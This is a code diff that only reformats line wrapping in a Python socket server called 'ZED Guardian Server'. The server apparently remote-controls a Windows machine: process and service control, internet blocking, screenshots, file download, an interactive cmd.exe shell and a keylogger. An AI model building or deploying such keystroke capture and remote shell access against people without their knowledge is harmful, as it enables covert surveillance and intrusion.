@@ -84,7 +84,9 @@ class SystemInfoManager:
             for interface, addresses in interfaces.items():
                 for addr in addresses:
                     if addr.family == psutil.AF_LINK:
-                        return addr.address  # Return the first MAC address found
+                        return (
+                            addr.address
+                        )  # Return the first MAC address found
             return "Unknown MAC Address"
         except Exception as e:
             Logger.log("error", f"Error retrieving MAC address: {e}")
@@ -199,10 +201,14 @@ class ProcessManager:
         try:
             processes = [
                 proc.info
-                for proc in psutil.process_iter(attrs=["pid", "name", "username"])
+                for proc in psutil.process_iter(
+                    attrs=["pid", "name", "username"]
+                )
             ]
             Logger.log("info", "Fetched process list.")
-            return create_response(True, "Processes fetched successfully.", processes)
+            return create_response(
+                True, "Processes fetched successfully.", processes
+            )
         except Exception as e:
             Logger.log("error", f"Error fetching processes: {e}")
             return create_response(False, f"Error fetching processes: {e}")
@@ -213,10 +219,14 @@ class ProcessManager:
         try:
             psutil.Process(pid).terminate()
             Logger.log("info", f"Terminated process {pid}.")
-            return create_response(True, f"Process {pid} terminated successfully.")
+            return create_response(
+                True, f"Process {pid} terminated successfully."
+            )
         except Exception as e:
             Logger.log("error", f"Error terminating process {pid}: {e}")
-            return create_response(False, f"Error terminating process {pid}: {e}")
+            return create_response(
+                False, f"Error terminating process {pid}: {e}"
+            )
 
 
 class ServiceManager:
@@ -238,7 +248,9 @@ class ServiceManager:
                 for service in psutil.win_service_iter()
             ]
             Logger.log("info", "Fetched service list.")
-            return create_response(True, "Services fetched successfully.", services)
+            return create_response(
+                True, "Services fetched successfully.", services
+            )
         except Exception as e:
             Logger.log("error", f"Error fetching services: {e}")
             return create_response(False, f"Error fetching services: {e}")
@@ -265,7 +277,9 @@ class ServiceManager:
                 )
                 return create_response(False, result.stdout)
         except Exception as e:
-            Logger.log("error", f"Error stopping service '{service_name}': {e}")
+            Logger.log(
+                "error", f"Error stopping service '{service_name}': {e}"
+            )
             return create_response(
                 False, f"Error stopping service '{service_name}': {e}"
             )
@@ -317,7 +331,9 @@ class NetworkManager:
                 check=True,
             )
             # Notify the system of proxy changes
-            subprocess.run(["RunDll32.exe", "InetCpl.cpl,LaunchConnectionDialog"])
+            subprocess.run(
+                ["RunDll32.exe", "InetCpl.cpl,LaunchConnectionDialog"]
+            )
             Logger.log("info", f"Proxy set to {proxy_address}")
         except subprocess.CalledProcessError as e:
             Logger.log("error", f"Failed to set proxy: {e}")
@@ -345,7 +361,9 @@ class NetworkManager:
                 check=True,
             )
             # Notify the system of proxy changes
-            subprocess.run(["RunDll32.exe", "InetCpl.cpl,LaunchConnectionDialog"])
+            subprocess.run(
+                ["RunDll32.exe", "InetCpl.cpl,LaunchConnectionDialog"]
+            )
             Logger.log("info", "Proxy reset to default")
         except subprocess.CalledProcessError as e:
             Logger.log("error", f"Failed to reset proxy: {e}")
@@ -367,7 +385,9 @@ class NetworkManager:
             return create_response(True, "Internet is still accessible.")
         except subprocess.CalledProcessError:
             Logger.log("info", "Internet is confirmed to be blocked.")
-            return create_response(False, "Internet is confirmed to be blocked.")
+            return create_response(
+                False, "Internet is confirmed to be blocked."
+            )
 
     @staticmethod
     def block_internet():
@@ -415,9 +435,7 @@ class SchedulerManager:
         pass
 
     schedule = []  # Stores schedules
-    current_state = (
-        None  # Tracks if internet is blocked or unblocked ("blocked" or "unblocked")
-    )
+    current_state = None  # Tracks if internet is blocked or unblocked ("blocked" or "unblocked")
 
     @staticmethod
     def add_schedule(
@@ -519,7 +537,9 @@ class SchedulerManager:
         if should_block and SchedulerManager.current_state != "blocked":
             NetworkManager.block_internet()
             SchedulerManager.current_state = "blocked"
-        elif not should_block and SchedulerManager.current_state != "unblocked":
+        elif (
+            not should_block and SchedulerManager.current_state != "unblocked"
+        ):
             NetworkManager.unblock_internet()
             SchedulerManager.current_state = "unblocked"
 
@@ -576,7 +596,9 @@ class ScreenshotManager:
             # Save the screenshot
             timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
             window_title = (
-                win32gui.GetWindowText(window_id).replace(" ", "_").replace(":", "-")
+                win32gui.GetWindowText(window_id)
+                .replace(" ", "_")
+                .replace(":", "-")
             )
             filename = f"{window_title}-{timestamp}.png"
             file_path = os.path.join(os.getcwd(), filename)
@@ -653,7 +675,9 @@ class ConsoleManager:
         Appends the raw output from the cmd.exe session to the log file immediately.
         """
         try:
-            if not COMMAND_OUTPUT_LOG or not os.path.exists(COMMAND_OUTPUT_LOG):
+            if not COMMAND_OUTPUT_LOG or not os.path.exists(
+                COMMAND_OUTPUT_LOG
+            ):
                 raise ValueError(
                     "Command output log path is not initialized or does not exist."
                 )
@@ -689,7 +713,9 @@ class ConsoleManager:
                 initial_output = ""
                 while True:
                     line = ConsoleManager.process.stdout.readline()
-                    if not line.strip():  # Stop reading on the first empty line
+                    if (
+                        not line.strip()
+                    ):  # Stop reading on the first empty line
                         break
                     initial_output += line
                     ConsoleManager.write_to_command_log(line)  # Log each line
@@ -744,7 +770,10 @@ class ConsoleManager:
         Stops the persistent shell process.
         """
         try:
-            if ConsoleManager.process and ConsoleManager.process.poll() is None:
+            if (
+                ConsoleManager.process
+                and ConsoleManager.process.poll() is None
+            ):
                 ConsoleManager.process.terminate()
                 ConsoleManager.process = None
                 Logger.log("info", "Interactive cmd.exe shell stopped.")
@@ -797,12 +826,16 @@ class KeyloggerManager:
     def get_logs() -> dict:
         """Fetches the collected key logs."""
         formatted_logs = "".join(KeyloggerManager.key_logs)
-        return create_response(True, "Key logs fetched successfully.", formatted_logs)
+        return create_response(
+            True, "Key logs fetched successfully.", formatted_logs
+        )
 
     @staticmethod
     def _run_keylogger() -> None:
         """Internal method to capture keypresses."""
-        with keyboard.Listener(on_press=KeyloggerManager._on_key_press) as listener:
+        with keyboard.Listener(
+            on_press=KeyloggerManager._on_key_press
+        ) as listener:
             listener.join()
 
     @staticmethod
@@ -829,7 +862,9 @@ class KeyloggerManager:
 
 COMMAND_HANDLERS = {
     "get_processes": lambda payload=None: ProcessManager.get_processes(),
-    "kill_process": lambda payload: ProcessManager.kill_process(payload["pid"]),
+    "kill_process": lambda payload: ProcessManager.kill_process(
+        payload["pid"]
+    ),
     "get_services": lambda payload=None: ServiceManager.get_services(),
     "stop_service": lambda payload: ServiceManager.stop_service(
         payload["service_name"]
@@ -868,8 +903,12 @@ COMMAND_HANDLERS = {
             "location": SystemInfoManager.get_location(),
         },
     ),
-    "set_log_level": lambda payload: Logger.set_log_level(payload.get("level")),
-    "list_files": lambda payload: FileManager.list_files(payload.get("directory", ".")),
+    "set_log_level": lambda payload: Logger.set_log_level(
+        payload.get("level")
+    ),
+    "list_files": lambda payload: FileManager.list_files(
+        payload.get("directory", ".")
+    ),
     "download_file": lambda payload: FileManager.download_file(
         payload.get("file_path")
     ),
@@ -880,7 +919,9 @@ def send_response(conn: socket.socket, response: dict) -> None:
     try:
         response_str = json.dumps(response)
         length_prefix = f"{len(response_str):<10}"
-        conn.sendall(length_prefix.encode("utf-8") + response_str.encode("utf-8"))
+        conn.sendall(
+            length_prefix.encode("utf-8") + response_str.encode("utf-8")
+        )
         conn.shutdown(socket.SHUT_WR)
     except Exception as e:
         Logger.log("error", f"Error sending response: {e}")
@@ -923,7 +964,9 @@ def handle_client(conn: socket.socket) -> None:
                 send_response(conn, response)
 
             except json.JSONDecodeError:
-                send_response(conn, create_response(False, "Invalid JSON format."))
+                send_response(
+                    conn, create_response(False, "Invalid JSON format.")
+                )
             except Exception as e:
                 Logger.log(
                     "error",
@@ -957,5 +1000,7 @@ if __name__ == "__main__":
     Logger.log("info", "ZED Guardian Server started.")
 
     # Start the network scheduler in a separate thread
-    threading.Thread(target=SchedulerManager.apply_schedule, daemon=True).start()
+    threading.Thread(
+        target=SchedulerManager.apply_schedule, daemon=True
+    ).start()
     start_server()
